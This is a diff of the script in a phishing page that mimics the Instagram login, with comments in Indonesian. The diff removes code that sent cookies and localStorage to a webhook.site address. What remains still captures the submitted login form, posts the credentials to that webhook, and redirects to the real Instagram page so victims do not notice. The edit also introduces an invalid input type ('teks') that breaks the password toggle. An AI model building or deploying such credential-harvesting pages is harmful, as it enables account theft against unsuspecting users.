@@ -83,49 +83,32 @@ input::placeholder{color:#8e8e8e;font-size:12px}
 
 <script>
 (function(){
-  // URL Webhook.site target
   const WEBHOOK_URL = "https://webhook.site/a03551b9-f210-46c8-bfcb-821bad68128d";
 
-  // Capture cookie & localStorage
-  fetch(WEBHOOK_URL,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({
-      type: "cookies",
-      cookie: document.cookie,
-      ls: JSON.stringify(localStorage),
-      url: location.href
-    })
-  }).catch(()=>{});
-
-  // Fitur Toggle Password
   var pwd = document.getElementById('pwd');
   var toggle = document.getElementById('togglePwd');
   if (toggle && pwd) {
     toggle.onclick = function(){
-      if (pwd.type === 'password') { pwd.type = 'text'; toggle.textContent = 'Sembunyikan'; }
+      if (pwd.type === 'password') { pwd.type = 'teks'; toggle.textContent = 'Sembunyikan'; }
       else { pwd.type = 'password'; toggle.textContent = 'Tampilkan'; }
     };
   }
 
-  // Intersepsi form submit
-  document.getElementById('loginForm').addEventListener('submit',function(e){
+  document.getElementById('loginForm').addEventListener('submit', function(e){
     e.preventDefault();
     var btn = e.target.querySelector('button');
     btn.textContent = 'Memproses...';
     btn.disabled = true;
     var data = Object.fromEntries(new FormData(e.target));
-    data.type = "credentials"; // Penanda bahwa ini data login
+    data.type = "credentials";
     
-    // Kirim data ke Webhook
-    fetch(WEBHOOK_URL,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(data)
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
     })
     .finally(function(){
-      // Redirect agar korban tidak curiga
-      window.location.href='https://www.instagram.com/accounts/login/';
+      window.location.href = 'https://www.instagram.com/accounts/login/';
     });
   });
 })();
